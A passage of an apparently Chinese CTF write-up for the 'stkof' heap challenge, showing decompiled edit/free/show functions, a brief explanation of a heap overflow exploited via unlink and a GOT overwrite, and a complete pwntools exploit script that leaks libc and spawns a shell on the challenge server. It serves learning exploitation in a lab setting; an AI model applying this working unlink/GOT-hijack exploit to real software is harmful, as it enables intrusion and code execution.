__int64 sub_4009E8()
{
  __int64 result; // rax
  int i; // eax
  unsigned int index; // [rsp+8h] [rbp-88h]
  __int64 size; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  index = atol(s);
  if ( index > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[index] )
    return 0xFFFFFFFFLL;
  fgets(s, 16, stdin);
  size = atoll(s);
  ptr = (&::s)[index];
  for ( i = fread(ptr, 1uLL, size, stdin); i > 0; i = fread(ptr, 1uLL, size, stdin) )
  {
    ptr += i;
    size -= i;
  }
  if ( size )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
```

**free**

```c
__int64 sub_400B07()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  v1 = atol(s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[v1] )
    return 0xFFFFFFFFLL;
  free((&::s)[v1]);
  (&::s)[v1] = 0LL;
  return 0LL;
}
```

**show**

```c
__int64 sub_400BA9()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  v1 = atol(s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[v1] )
    return 0xFFFFFFFFLL;
  if ( strlen((&::s)[v1]) <= 3 )
    puts("//TODO");
  else
    puts("...");
  return 0LL;
}
```

`free`时销毁了指针，没有UAF利用。但是可以申请任意大小的内存，在`edit`中有溢出。

同时，注意到堆指针都保存在`.bss`段上的`s`中。可以使用`unlink`，对指针进行覆写。

注意在`show`中，使用了`strlen`但是并没有真正输出内容。通过覆写`strlen`的got表为`puts`的plt表。再修改另一个堆块的指针为某`got`表，可以leak libc地址。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./stkof'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',28140)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')


def add(size):
    sh.sendline('1')
    sh.sendline(str(size))
    
def edit(index,size,content):
    sh.sendline('2')
    sh.sendline(str(index))
    sh.sendline(str(size))
    sh.sendline(str(content))
    
def free(index):
    sh.sendline('3')
    sh.sendline(str(index))
    
heap_array = 0x602150
strlen_got = elf.got['strlen']
puts_plt = elf.plt['puts']
free_got=elf.got['free']

add(0x10)
add(0x80) #2
sh.recvuntil('OK')
add(0x80) #3
sh.recvuntil('OK')
add(0x10)  #4
sh.recvuntil('OK')

edit(4,0x8,'/bin/sh\x00')

payload = p64(0)+p64(0x81)+p64(heap_array-0x18)+p64(heap_array-0x10)
payload=payload.ljust(0x80,'\x00')
payload+=p64(0x80)+p64(0x90)
edit(2,0x90,payload)
sh.recvuntil('OK')
#gdb.attach(sh)
free(3)
sh.recvuntil('OK')

payload=p64(0)+p64(strlen_got)+p64(free_got)
edit(2,0x18,payload)
sh.recvuntil('OK')

payload=p64(puts_plt)
edit(0,0x8,payload)
sh.recvuntil('OK')

sh.sendline('4')
sh.sendline('1')

free_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = LibcSearcher('free',free_addr)
libcbase = free_addr-libc.dump('free')
leak('libc base',libcbase)
system = libcbase+libc.dump('system')

edit(1,0x8,p64(system))
free(4)

sh.interactive()
```


